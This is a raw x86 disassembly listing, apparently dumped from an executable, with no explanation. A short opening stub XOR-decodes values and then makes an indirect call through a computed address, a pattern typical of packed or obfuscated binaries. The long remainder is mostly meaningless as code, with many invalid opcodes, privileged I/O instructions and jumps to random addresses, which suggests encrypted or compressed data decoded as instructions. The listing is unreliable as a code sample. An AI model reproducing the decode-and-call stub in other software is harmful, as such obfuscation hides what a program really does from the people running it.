  40cb93:	add    BYTE PTR [edx],dl
  40cb95:	fiadd  DWORD PTR [ebx]
  40cb97:	(bad)  
  40cb98:	imul   eax,DWORD PTR [edx]
  40cb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40cb9e:	xor    edx,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8+0xc]
  40cbfc:	retf   0x4367
  40cbff:	bound  ecx,QWORD PTR [esi+edi*2+0x7e7c387e]
  40cc06:	jle    0x40cbc9
  40cc08:	jg     0x40cbf5
  40cc0a:	fimul  DWORD PTR [ebx]
  40cc0c:	jle    0x40cc8d
  40cc0e:	fidivr WORD PTR [edi-0x45]
  40cc11:	push   esi
  40cc12:	pop    esi
  40cc13:	out    dx,eax
  40cc14:	mov    edi,0xf6eaca4d
  40cc19:	mov    cl,0xe8
  40cc1b:	mov    esp,0x2ebcbeb1
  40cc20:	call   0x6bd761ea
  40cc25:	xchg   edi,eax
  40cc26:	sti    
  40cc27:	lock mov al,0xdd
  40cc2a:	jp     0x40cc2d
  40cc2c:	add    dh,bh
  40cc2e:	sbb    al,0xc
  40cc30:	call   0x594c9443
  40cc35:	sbb    al,0x2e
  40cc37:	xchg   ecx,eax
  40cc38:	inc    BYTE PTR [ebp-0xc0db363]
  40cc3e:	cld    
  40cc3f:	ins    DWORD PTR es:[di],dx
  40cc41:	sbb    eax,0x49dda3e0
  40cc46:	xchg   bl,dh
  40cc48:	lahf   
  40cc49:	mov    ch,cl
  40cc4b:	or     bl,ah
  40cc4d:	push   ebp
  40cc4e:	mov    edi,0x9fc2e3c2
  40cc53:	ror    bl,cl
  40cc55:	stc    
  40cc56:	dec    edx
  40cc57:	or     eax,0xc4a6221f
  40cc5c:	xchg   BYTE PTR [edx+0x4faea5d5],ah
  40cc62:	stos   DWORD PTR es:[edi],eax
  40cc63:	ss dec esp
  40cc65:	lods   eax,DWORD PTR ds:[esi]
  40cc66:	pop    edi
  40cc67:	iret   
  40cc68:	inc    dl
  40cc6a:	jo     0x40ccd7
  40cc6c:	and    bl,BYTE PTR [edi*1-0x9f5b31a]
  40cc73:	push   esp
  40cc74:	out    dx,al
  40cc75:	adc    edi,DWORD PTR ds:0x474faa76
  40cc7b:	xor    ch,BYTE PTR [esi]
  40cc7d:	dec    ebp
  40cc7e:	stos   DWORD PTR es:[edi],eax
  40cc7f:	je     0x40ccd1
  40cc81:	cld    
  40cc82:	loopne 0x40cc88
  40cc84:	fst    QWORD PTR [ebp+0x444903c8]
  40cc8a:	imul   esi,DWORD PTR [eax+0x3494b11],0x4
  40cc91:	cdq    
  40cc92:	xchg   edx,eax
  40cc93:	call   0xed4e:0x5ba62274
  40cc9a:	pop    ss
  40cc9b:	loope  0x40cd03
  40cc9d:	shr    DWORD PTR [edx+edx*1+0x11],1
  40cca1:	ins    DWORD PTR es:[edi],dx
  40cca2:	fadd   st,st(4)
  40cca4:	dec    eax
  40cca5:	in     eax,0xe4
  40cca7:	leave  
  40cca8:	loope  0x40cc88
  40ccaa:	mov    al,0x5a
  40ccac:	out    0xaa,al
  40ccae:	nop
  40ccaf:	daa    
  40ccb0:	mov    edx,0x116fe91a
  40ccb5:	or     eax,0x4dba473a
  40ccba:	jg     0x40ccf5
  40ccbc:	cmp    BYTE PTR [edi],ch
  40ccbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccc0:	enter  0x874,0x1a
  40ccc4:	mov    eax,0x1d5d9a
  40ccc9:	dec    ebx
  40ccca:	les    ebp,FWORD PTR [ebx]
  40cccc:	aas    
  40cccd:	xor    al,0x57
  40cccf:	mov    cl,0xa0
  40ccd1:	outs   dx,DWORD PTR ds:[esi]
  40ccd2:	pop    ebp
  40ccd3:	test   DWORD PTR [esi+0x1a],ecx
  40ccd6:	inc    eax
  40ccd7:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccd9:	imul   eax,DWORD PTR [eax+0x6f],0x6c
  40ccdd:	and    al,0xf3
  40ccdf:	xor    DWORD PTR [ebp-0x20ee8b02],0x55
  40cce6:	enter  0x9e67,0xc4
  40ccea:	xor    eax,0x1172acd3
  40ccef:	repz ja 0x40cd64
  40ccf2:	shr    DWORD PTR [eax-0x5935198a],1
  40ccf8:	and    DWORD PTR [esi],esp
  40ccfa:	jbe    0x40cc9e
  40ccfc:	mov    eax,ds:0x25026920
  40cd01:	stc    
  40cd02:	or     eax,0x9c4f3066
  40cd07:	xchg   ebp,eax
  40cd08:	pop    edx
  40cd09:	mov    edi,ebp
  40cd0b:	into   
  40cd0c:	shl    DWORD PTR [edx-0x41e619b5],cl
  40cd12:	imul   esp,DWORD PTR [esi],0xacec2c3b
  40cd18:	mov    ebx,0xa0e1afc6
  40cd1d:	inc    esp
  40cd1e:	shr    BYTE PTR [edx-0x15039190],cl
  40cd24:	cmc    
  40cd25:	add    edx,DWORD PTR [ecx-0x1459d861]
  40cd2b:	mov    edi,0x55446af6
  40cd30:	sbb    al,BYTE PTR [edi+0xc]
  40cd33:	or     al,0xb0
  40cd35:	push   edi
  40cd36:	xor    edx,DWORD PTR [edi]
  40cd38:	lea    ecx,[ecx+0x451c9213]
  40cd3e:	pop    ecx
  40cd3f:	call   0xfb214077
  40cd44:	xchg   edx,eax
  40cd45:	cwde   
  40cd46:	scas   eax,DWORD PTR es:[edi]
  40cd47:	mov    dl,0xea
  40cd49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd4a:	jg     0x40cd53
  40cd4c:	sbb    eax,0xca5d8a6b
  40cd51:	gs mov ecx,0xf8661d25
  40cd57:	lock (bad) 
  40cd59:	pusha  
  40cd5a:	data16 test al,0x33
  40cd5d:	dec    DWORD PTR [ebp+0x459f1cde]
  40cd63:	imul   ecx,DWORD PTR [eax-0x561c8676],0xffffffe5
  40cd6a:	dec    ecx
  40cd6b:	mov    eax,0x8aca1826
  40cd70:	enter  0x4f58,0x9e
  40cd74:	sbb    al,0xaa
  40cd76:	jmp    0xa4eb9dee
  40cd7b:	adc    ecx,eax
  40cd7d:	pop    ecx
  40cd7e:	arpl   WORD PTR [ebp+ecx*2+0x7c],cx
  40cd82:	dec    esp
  40cd83:	leave  
  40cd84:	sahf   
  40cd85:	adc    ecx,DWORD PTR [ebx+0x3ef9e4e0]
  40cd8b:	ret    
  40cd8c:	aaa    
  40cd8d:	sbb    DWORD PTR [edi+0x7b7657ec],eax
  40cd93:	pop    esi
  40cd94:	out    dx,eax
  40cd95:	jmp    0x94cc:0x303e9f2b
  40cd9c:	and    eax,0x1f3aeed3
  40cda1:	jns    0x40cd37
  40cda3:	push   esp
  40cda4:	push   ss
  40cda5:	scas   eax,DWORD PTR es:[edi]
  40cda6:	push   edx
  40cda7:	inc    ecx
  40cda8:	(bad)  
  40cdaa:	xlat   BYTE PTR ds:[ebx]
  40cdab:	test   DWORD PTR [edx+0x47],ebp
  40cdae:	or     BYTE PTR [edi+0x604e093a],cl
  40cdb4:	and    al,0xff
  40cdb6:	xchg   ebp,eax
  40cdb7:	jle    0x40ce17
  40cdb9:	adc    ah,BYTE PTR [edi-0x46]
  40cdbc:	jmp    0x5463:0x9a699359
  40cdc3:	xchg   ebx,eax
  40cdc4:	imul   esp,DWORD PTR [ecx],0xef977cf8
  40cdca:	aam    0x3b
  40cdcc:	jns    0x40cd7e
  40cdce:	add    al,0xb9
  40cdd0:	mov    edi,0x9c6b0fc6
  40cdd5:	dec    eax
  40cdd6:	or     BYTE PTR [ebx+eiz*8+0x758095b1],dl
  40cddd:	mov    al,0xef
  40cddf:	in     eax,0xea
  40cde1:	into   
  40cde2:	jle    0x40cdcc
  40cde4:	call   0x24ac435
  40cde9:	ret    0x3ea7
  40cdec:	aas    
  40cded:	push   ss
  40cdee:	sti    
  40cdef:	jnp    0x40ce4f
  40cdf1:	mov    ?,WORD PTR [ebx+0x2eba6e62]
  40cdf7:	mov    edx,0x344485c9
  40cdfc:	icebp  
  40cdfd:	fdivr  DWORD PTR [esi-0x7d1c125e]
  40ce03:	xchg   edx,eax
  40ce04:	mov    ds:0xe51aa409,al
  40ce09:	inc    ebp
  40ce0a:	imul   eax,DWORD PTR [ecx],0x15
  40ce0d:	hlt    
  40ce0e:	pusha  
  40ce0f:	and    eax,DWORD PTR [esi+0x12]
  40ce12:	aas    
  40ce13:	dec    esp
  40ce14:	xchg   esp,eax
  40ce15:	inc    edi
  40ce16:	js     0x40cdaa
  40ce18:	or     BYTE PTR [edi],ah
  40ce1a:	add    al,0xb
  40ce1c:	rcr    bh,1
  40ce1e:	outs   dx,BYTE PTR ds:[esi]
  40ce1f:	fdivr  st(0),st
  40ce22:	push   esp
  40ce23:	sub    al,0x7d
  40ce25:	jmp    0x1c8a97f6
  40ce2a:	ret    
  40ce2b:	dec    esp
  40ce2c:	mov    bl,0x31
  40ce2e:	pop    esp
  40ce2f:	xchg   ecx,eax
  40ce30:	inc    bx
  40ce32:	dec    edx
  40ce33:	aaa    
  40ce34:	mov    BYTE PTR [esi],ah
  40ce36:	push   edx
  40ce37:	mov    esi,0xa870706
  40ce3c:	sbb    eax,0x36f08a58
  40ce41:	shr    BYTE PTR [esi-0x6978022b],1
  40ce47:	push   ebp
  40ce48:	imul   edx,ebx,0xfffffff1
  40ce4b:	into   
  40ce4c:	loop   0x40ce79
  40ce4e:	fld    DWORD PTR [edi+0x25ee9cb]
  40ce54:	add    BYTE PTR [eax],al
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	aas    
  40ce63:	jmp    0x40ce72
  40ce65:	scas   al,BYTE PTR es:[edi]
  40ce66:	sub    al,0x8b
  40ce68:	jle    0x40cee8
  40ce6a:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ce6e:	pusha  
  40ce6f:	leave  
  40ce70:	mov    al,0x8c
  40ce72:	add    al,BYTE PTR [esi]
  40ce74:	pop    esi
  40ce75:	pop    ss
  40ce76:	and    ecx,0x8
  40ce79:	data16 clc 
  40ce7b:	(bad)  
  40ce7c:	and    al,0x98
  40ce7e:	sti    
  40ce7f:	sub    DWORD PTR [ecx-0x6c],esp
  40ce82:	les    ecx,FWORD PTR [esi-0x6d931f8d]
  40ce88:	test   eax,0xd6848d84
  40ce8d:	mov    bl,0x54
  40ce8f:	jmp    ebx
  40ce91:	push   0xffffffb6
  40ce93:	dec    ebp
  40ce94:	mov    dl,0x19
  40ce96:	push   esp
  40ce97:	pop    ebx
  40ce98:	sub    BYTE PTR [ebp+0x7e],0xd2
  40ce9c:	jle    0x40ceb0
  40ce9e:	inc    eax
  40ce9f:	push   eax
  40cea0:	pop    ebp
  40cea1:	mov    dh,0x1f
  40cea3:	pop    ebp
  40cea4:	retf   
  40cea5:	je     0x40cf22
  40cea7:	aas    
  40cea8:	shr    DWORD PTR [ecx-0x73fae320],1
  40ceae:	or     ebx,DWORD PTR [ebx+0x5ec7cf67]
  40ceb4:	fnstcw WORD PTR [edx+eax*4+0x7d9ae018]
  40cebb:	mov    ecx,0x375109a9
  40cec0:	pop    eax
  40cec1:	outs   dx,BYTE PTR ds:[esi]
  40cec2:	fstp   DWORD PTR [eax]
  40cec4:	or     BYTE PTR [edi-0x20f53f97],dh
  40ceca:	push   ebp
  40cecb:	push   edx
  40cecc:	out    dx,al
  40cecd:	out    0xe3,al
  40cecf:	inc    esp
  40ced0:	pop    esi
  40ced1:	loope  0x40cf2b
  40ced3:	jae    0x40ceff
  40ced5:	dec    eax
  40ced6:	inc    ecx
  40ced7:	push   ebx
  40ced8:	fisttp WORD PTR [ecx+0x1c]
  40cedb:	mov    ds:0x60080fc1,al
  40cee0:	pop    eax
  40cee1:	xchg   edx,eax
  40cee2:	jp     0x40ceab
  40cee4:	push   ebx
  40cee5:	ror    BYTE PTR [edx+esi*2],1
  40cee8:	mov    bl,ch
  40ceea:	push   0xd
  40ceec:	xchg   edx,edi
  40ceee:	jp     0x40cefa
  40cef0:	pop    edi
  40cef1:	xor    BYTE PTR [ebx],0xcf
  40cef4:	xchg   BYTE PTR [eax+0x2c48d808],ah
  40cefa:	dec    edx
  40cefb:	mov    esp,0xaecd5018
  40cf00:	js     0x40cf32
  40cf02:	or     edi,0x3e
  40cf05:	jnp    0x40cf16
  40cf07:	add    BYTE PTR [eax],dh
  40cf09:	adc    ebx,DWORD PTR [esi]
  40cf0b:	sub    ah,BYTE PTR [edx]
  40cf0d:	test   al,0xe1
  40cf0f:	sub    eax,0x3704a73b
  40cf14:	xlat   BYTE PTR ds:[ebx]
  40cf15:	(bad)  
  40cf16:	in     al,dx
  40cf17:	ins    DWORD PTR es:[edi],dx
  40cf18:	dec    eax
  40cf19:	fidivr DWORD PTR [ebp+eiz*2-0x2a]
  40cf1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf1e:	scas   eax,DWORD PTR es:[edi]
  40cf1f:	cmc    
  40cf20:	(bad)  
  40cf21:	imul   edx,edi,0x18089241
  40cf27:	test   eax,0x39dadce5
  40cf2c:	arpl   si,sp
  40cf2e:	stc    
  40cf2f:	pop    ebx
  40cf30:	stos   DWORD PTR es:[edi],eax
  40cf31:	popf   
  40cf32:	and    al,0x90
  40cf34:	sti    
  40cf35:	daa    
  40cf36:	popa   
  40cf37:	inc    ebx
  40cf38:	jge    0x40cedf
  40cf3a:	mov    sp,0xe743
  40cf3e:	dec    ecx
  40cf3f:	jne    0x40cf2f
  40cf41:	out    dx,eax
  40cf42:	aad    0xd5
  40cf44:	sar    BYTE PTR [edi],0xdd
  40cf47:	popa   
  40cf48:	aad    0x85
  40cf4a:	test   BYTE PTR [ebp-0x717ad4eb],dl
  40cf50:	pop    esp
  40cf51:	mov    bl,0xd7
  40cf53:	pushf  
  40cf54:	push   edx
  40cf55:	shl    bl,cl
  40cf57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf58:	int    0x79
  40cf5a:	ins    DWORD PTR es:[edi],dx
  40cf5b:	ins    BYTE PTR es:[edi],dx
  40cf5c:	push   cs
  40cf5d:	inc    ecx
  40cf5e:	aas    
  40cf5f:	inc    eax
  40cf60:	lods   eax,DWORD PTR ds:[esi]
  40cf61:	retf   
  40cf62:	scas   al,BYTE PTR es:[edi]
  40cf63:	or     dl,ch
  40cf65:	cs jmp 0x40cef3
  40cf68:	in     eax,0xf6
  40cf6a:	or     esi,DWORD PTR [edx+0x3b3b6623]
  40cf70:	loop   0x40cf8d
  40cf72:	inc    esi
  40cf73:	xchg   ebx,eax
  40cf74:	or     al,0xf9
  40cf76:	pop    ss
  40cf77:	inc    ebp
  40cf78:	add    ebp,ebp
  40cf7a:	jl     0x40cf74
  40cf7c:	jmp    0x40cf6e
  40cf7e:	jmp    0x3aa19187
  40cf83:	or     BYTE PTR [edi-0x77b7db04],al
  40cf89:	push   0x1fa75ba6
  40cf8e:	call   0x80ac:0x89eb6c8a
  40cf95:	fisub  WORD PTR [ebx-0x5b]
  40cf98:	adc    BYTE PTR [eax+0x41],0x3e
  40cf9c:	adc    al,0x66
  40cf9e:	jmp    0x40cf8a
  40cfa0:	push   edx
  40cfa1:	js     0x40d016
  40cfa3:	lds    esi,FWORD PTR [esp+edi*8]
  40cfa6:	(bad)  
  40cfa7:	and    al,0xe4
  40cfa9:	xor    al,0xc6
  40cfab:	call   0x1291:0xecc227da
  40cfb2:	push   0xe3bea8f0
  40cfb7:	xchg   edi,edi
  40cfb9:	test   al,0x6
  40cfbb:	in     eax,0x1a
  40cfbd:	cmp    BYTE PTR [edx],bh
  40cfbf:	sbb    dl,BYTE PTR [ebp+0x5e]
  40cfc2:	daa    
  40cfc3:	in     al,0x91
  40cfc5:	mov    esi,0x68fb04d4
  40cfca:	imul   esi,DWORD PTR [ebx],0x635f5bcb
  40cfd0:	loop   0x40cf86
  40cfd2:	lock or ebp,DWORD PTR [ecx]
  40cfd5:	push   ecx
  40cfd6:	xor    DWORD PTR [esi-0x15],eax
  40cfd9:	call   FWORD PTR [edi]
  40cfdb:	xor    DWORD PTR [esi+0xdadc3b1],ebp
  40cfe1:	xabort 0xce
  40cfe4:	les    ebx,FWORD PTR [ebx]
  40cfe6:	lahf   
  40cfe7:	call   0x28c49ff5
  40cfec:	cmc    
  40cfed:	shl    DWORD PTR [edx+0x5d689c3f],cl
  40cff3:	mov    esp,0xd93ee078
  40cff8:	loope  0x40d022
  40cffa:	push   dx
  40cffc:	popa   
  40cffd:	sbb    al,0x3d
  40cfff:	push   ecx
  40d000:	setno  dh
  40d003:	xchg   edi,eax
  40d004:	and    eax,0x9acac03
  40d009:	call   0x8213:0x1284d620
  40d010:	jmp    0xa275:0xcfffe2f6
  40d017:	pushf  
  40d018:	fisubr WORD PTR [ebx+ebp*1]
  40d01b:	push   ebx
  40d01c:	in     al,0x25
  40d01e:	jl     0x40d06f
  40d020:	mov    es,WORD PTR [ebx+0x5]
  40d023:	retf   
  40d024:	xor    eax,0x578970a5
  40d029:	adc    al,0x92
  40d02b:	cs pop esp
  40d02d:	imul   esp,DWORD PTR [ebp+edx*2+0x542ca326],0xb4db51dc
  40d038:	aam    0x50
  40d03a:	repz fs jg 0x40cfe1
  40d03e:	add    DWORD PTR [esi+edi*8-0x1a],esp
  40d042:	cmp    eax,0x869c8046
  40d047:	sub    bh,BYTE PTR [eax-0x9c1169d]
  40d04d:	mov    cl,0x95
  40d04f:	into   
  40d050:	in     eax,0xad
  40d052:	cli    
  40d053:	(bad)  
  40d055:	sub    BYTE PTR [ebp+0x5f],al
  40d058:	mov    esp,0xcd2cc2fd
  40d05d:	mov    ecx,0x72e43b7d
  40d062:	inc    ebx
  40d063:	sbb    al,0x55
  40d065:	dec    esp
  40d066:	fdivr  QWORD PTR es:[esi+0x59]
  40d06a:	mov    al,ds:0xc88470a3
  40d06f:	mov    bl,0xf3
  40d071:	aas    
  40d072:	aaa    
  40d073:	daa    
  40d074:	mov    ah,0x7a
  40d076:	es push edx
  40d078:	(bad)  
  40d079:	retf   0xdde5
  40d07c:	sbb    bl,BYTE PTR [ecx]
  40d07e:	and    al,0x8f
  40d080:	mov    eax,0xf6af9ed4
  40d085:	sbb    BYTE PTR [ebp-0x7e],dl
  40d088:	fild   DWORD PTR [edx+0x32a97732]
  40d08e:	in     eax,0x4e
  40d090:	ds (bad) 
  40d092:	mov    dh,0x89
  40d094:	add    eax,ebp
  40d096:	xor    BYTE PTR [ecx+0x1d],al
  40d099:	test   DWORD PTR [edx-0x4aa6c7f9],0x1ee213a0
  40d0a3:	and    DWORD PTR [edx-0xf],esp
  40d0a6:	repz (bad) 
  40d0a8:	nop
  40d0a9:	mov    ch,0x1f
  40d0ab:	stos   BYTE PTR es:[edi],al
  40d0ac:	mov    edi,0xd8b04287
  40d0b1:	inc    esp
  40d0b2:	mov    ebp,0x458b492d
  40d0b7:	in     al,0xf
  40d0b9:	scas   eax,DWORD PTR es:[edi]
  40d0ba:	rol    DWORD PTR [ebx],0xe0
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	pop    edi
  40d0d0:	int    0xb6
  40d0d2:	mov    ch,0xf6
  40d0d4:	mov    DWORD PTR [esi+0x7e],edi
  40d0d7:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d0db:	std    
  40d0dc:	aam    0x91
  40d0de:	sbb    dl,dh
  40d0e0:	push   0x2b
  40d0e2:	push   edx
  40d0e3:	xchg   ebp,eax
  40d0e4:	mov    ss,WORD PTR [ebp+0x40098179]
  40d0ea:	(bad)  
  40d0eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0ec:	fsubp  st(4),st
  40d0ee:	sub    dl,BYTE PTR [ecx-0x2a9ebe5a]
  40d0f4:	into   
  40d0f5:	cli    
  40d0f6:	fwait
  40d0f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0f8:	jecxz  0x40d081
  40d0fa:	adc    edx,DWORD PTR [edx-0xe6db09d]
  40d100:	shl    BYTE PTR [ecx+0x68],cl
  40d103:	sub    DWORD PTR [ecx],0x807910d8
  40d109:	dec    ebx
  40d10a:	jmp    0x40d09a
  40d10c:	fsubr  st,st(2)
  40d10e:	mov    esi,0x73cf2295
  40d113:	out    dx,eax
  40d114:	imul   esp,DWORD PTR [ecx-0xd],0xf8441587
  40d11b:	inc    ebp
  40d11c:	or     eax,0xe593db80
  40d121:	cmp    ebp,DWORD PTR ds:0xb2351d6b
  40d127:	pop    edi
  40d128:	sbb    al,0x52
  40d12a:	dec    eax
  40d12b:	pop    ebx
  40d12c:	aam    0x70
  40d12e:	sbb    DWORD PTR [eax],0x8890859f
  40d134:	call   0x1479:0x11d75eeb
  40d13b:	repnz xchg al,bh
  40d13e:	jae    0x40d14d
  40d140:	imul   eax,DWORD PTR [eax+0x1911487],0xffffffc1
  40d147:	xchg   edi,eax
  40d148:	push   ecx
  40d149:	stos   BYTE PTR es:[edi],al
  40d14a:	lods   al,BYTE PTR ds:[esi]
  40d14b:	(bad)  
  40d14d:	inc    esp
  40d14e:	pop    eax
  40d14f:	and    esi,esp
  40d151:	push   0xffffffab
  40d153:	adc    al,0x71
  40d155:	aam    0xc0
  40d157:	adc    eax,0xa9356962
  40d15c:	xor    bl,BYTE PTR [ecx]
  40d15e:	dec    edi
  40d15f:	rcr    DWORD PTR [edx-0xf],0x80
  40d163:	outs   dx,BYTE PTR ds:[esi]
  40d164:	sub    eax,0x6bb16708
  40d169:	aad    0x35
  40d16b:	or     DWORD PTR [esi+ecx*8],ebx
  40d16e:	lods   al,BYTE PTR ds:[esi]
  40d16f:	ins    DWORD PTR es:[edi],dx
  40d170:	jle    0x40d171
  40d172:	jp     0x40d1da
  40d174:	add    DWORD PTR [edx+eiz*2],ebx
  40d177:	push   0xfffffff6
  40d179:	xchg   esp,eax
  40d17a:	popf   
  40d17b:	jl     0x40d167
  40d17d:	retf   0x20c3
  40d180:	lock sbb esp,eax
  40d183:	xchg   edx,eax
  40d184:	inc    eax
  40d185:	mov    ebx,0x13d0b774
  40d18a:	inc    ebx
  40d18b:	xchg   edi,eax
  40d18c:	pop    ebp
  40d18d:	repz push ds
  40d18f:	xchg   ebp,eax
  40d190:	mov    bl,0xf9
  40d192:	sbb    DWORD PTR [ecx-0x5bafb737],edi
  40d198:	es in  al,dx
  40d19a:	lahf   
  40d19b:	jp     0x40d192
  40d19d:	sahf   
  40d19e:	or     ch,BYTE PTR [edi+0x308065b9]
  40d1a4:	xchg   edx,eax
  40d1a5:	lahf   
  40d1a6:	into   
  40d1a7:	cdq    
  40d1a8:	sub    BYTE PTR [edx],0x50
  40d1ab:	outs   dx,BYTE PTR ss:[esi]
  40d1ad:	mov    bh,bh
  40d1af:	loopne 0x40d22d
  40d1b1:	mov    ecx,0xeabe03fe
  40d1b6:	jg     0x40d143
  40d1b8:	retf   
  40d1b9:	and    esi,edi
  40d1bb:	retf   
  40d1bc:	popa   
  40d1bd:	mov    ecx,0xb9f86b77
  40d1c2:	les    edx,FWORD PTR [edi+esi*2+0x21]
  40d1c6:	xchg   edx,eax
  40d1c7:	push   edx
  40d1c8:	cs data16 jnp 0x40d179
  40d1cc:	mov    edi,0x72cdb627
  40d1d1:	test   al,0x4
  40d1d3:	push   esi
  40d1d4:	(bad)  
  40d1d6:	mov    dl,0xda
  40d1d8:	rcl    BYTE PTR [edi],1
  40d1da:	and    al,0xff
  40d1dc:	cmp    DWORD PTR [ebx-0x32],0x7b
  40d1e0:	ret    0xad59
  40d1e3:	xchg   edx,eax
  40d1e4:	rsm    
  40d1e6:	cmovp  ebx,DWORD PTR [ebp+0x42]
  40d1ea:	test   al,0xfb
  40d1ec:	imul   esi,ebp,0xffffff86
  40d1ef:	inc    ebp
  40d1f0:	jmp    0x40d234
  40d1f2:	mov    esp,DWORD PTR [ecx-0x1651898b]
  40d1f8:	jmp    0x1fec:0x6eb44202
  40d1ff:	ds sbb ah,dl
  40d202:	xchg   ecx,eax
  40d203:	test   eax,0x6af11ab2
  40d208:	mov    dl,0xcd
  40d20a:	loop   0x40d234
  40d20c:	jl     0x40d1e2
  40d20e:	push   ebp
  40d20f:	cmp    cl,cl
  40d211:	hlt    
  40d212:	xor    eax,0xa320c912
  40d217:	adc    edi,DWORD PTR [ecx]
  40d219:	gs dec esi
  40d21b:	adc    ecx,ebx
  40d21d:	cdq    
  40d21e:	retf   0x5132
  40d221:	js     0x40d1dc
  40d223:	sbb    DWORD PTR [edx+ecx*8+0x6a35550a],esi
  40d22a:	adc    BYTE PTR ds:0xd17c3b35,0xa9
  40d231:	stos   BYTE PTR es:[edi],al
  40d232:	sbb    al,0x64
  40d234:	mov    edx,0xc76bf475
  40d239:	daa    
  40d23a:	das    
  40d23b:	outs   dx,DWORD PTR ds:[esi]
  40d23c:	sti    
  40d23d:	bound  esi,QWORD PTR [eax]
  40d23f:	lahf   
  40d240:	out    dx,al
  40d241:	add    BYTE PTR [ecx+eax*4],dl
  40d244:	(bad)  
  40d245:	jmp    0xbc162113
  40d24a:	shl    DWORD PTR [ecx-0xb],0x1a
  40d24e:	sbb    eax,0x508138de
  40d253:	daa    
  40d254:	jnp    0x40d22e
  40d256:	xchg   edx,eax
  40d257:	add    DWORD PTR [esp+ecx*2+0x7b],esi
  40d25b:	mov    cl,0x12
  40d25d:	mov    eax,0xdd03ea13
  40d262:	les    edx,FWORD PTR [esi+0xd]
  40d265:	cmp    eax,eax
  40d267:	cmp    dh,BYTE PTR [edx+0x19]
  40d26a:	imul   ecx,DWORD PTR [edx-0x1237ea2],0x1a
  40d271:	jno    0x40d20a
  40d273:	or     eax,0xc0b6363e
  40d278:	scas   eax,DWORD PTR es:[edi]
  40d279:	xchg   ecx,eax
  40d27a:	pushf  
  40d27b:	and    al,0xf0
  40d27d:	cmp    DWORD PTR [ecx],ebx
  40d27f:	mov    edi,0x546ebf99
  40d284:	or     esi,DWORD PTR [ebx+0x25ce40a7]
  40d28a:	push   ss
  40d28b:	sub    DWORD PTR [edi+esi*1+0x56],0x459f173d
  40d293:	test   eax,0x90bde9df
  40d298:	adc    ebp,DWORD PTR [edi+0x26]
  40d29b:	in     eax,0x72
  40d29d:	out    0x47,al
  40d29f:	outs   dx,DWORD PTR ds:[si]
  40d2a1:	jle    0x40d272
  40d2a3:	and    dh,BYTE PTR [esi+0x34]
  40d2a6:	lods   al,BYTE PTR ds:[esi]
  40d2a7:	lahf   
  40d2a8:	cwde   
  40d2a9:	adc    edx,esp
  40d2ab:	xor    al,BYTE PTR [esi]
  40d2ad:	int    0x4f
  40d2af:	mov    bl,0x83
  40d2b1:	push   edi
  40d2b2:	fbstp  TBYTE PTR [eax-0x53d9fa38]
  40d2b8:	adc    esp,edx
  40d2ba:	ja     0x40d252
  40d2bc:	lahf   
  40d2bd:	mov    DWORD PTR [edi],esi
  40d2bf:	mov    edi,0x7e5a2609
  40d2c4:	add    bh,BYTE PTR [ebp-0x6438d785]
  40d2ca:	rol    DWORD PTR [esi-0x283d193c],0x76
  40d2d1:	or     BYTE PTR [eax+0x529d084f],cl
  40d2d7:	xchg   edi,eax
  40d2d8:	xchg   esi,eax
  40d2d9:	cmp    DWORD PTR ds:0x4cbba8aa,esp
  40d2df:	mov    al,0xa2
  40d2e1:	loop   0x40d2d6
  40d2e3:	push   esi
  40d2e4:	mov    dl,0x86
  40d2e6:	je     0x40d269
  40d2e8:	and    BYTE PTR [eax],bl
  40d2ea:	ds push edi
  40d2ec:	dec    ebx
  40d2ed:	scas   eax,DWORD PTR es:[edi]
  40d2ee:	lds    esi,FWORD PTR [eax+0xb]
  40d2f1:	jle    0x40d359
  40d2f3:	fdivr  DWORD PTR [eax]
  40d2f5:	cmc    
  40d2f6:	popf   
  40d2f7:	(bad)  
  40d2f8:	vpunpckhbw xmm2,xmm4,XMMWORD PTR [ecx+0x8]
  40d2fd:	fs sahf 
  40d2ff:	fs ret 
  40d301:	aad    0x3b
  40d303:	stc    
  40d304:	sar    BYTE PTR [edi],cl
  40d306:	stos   BYTE PTR es:[edi],al
  40d307:	xchg   edi,eax
  40d308:	sar    BYTE PTR [ebx+eiz*1-0x346f11d1],cl
  40d30f:	inc    edx
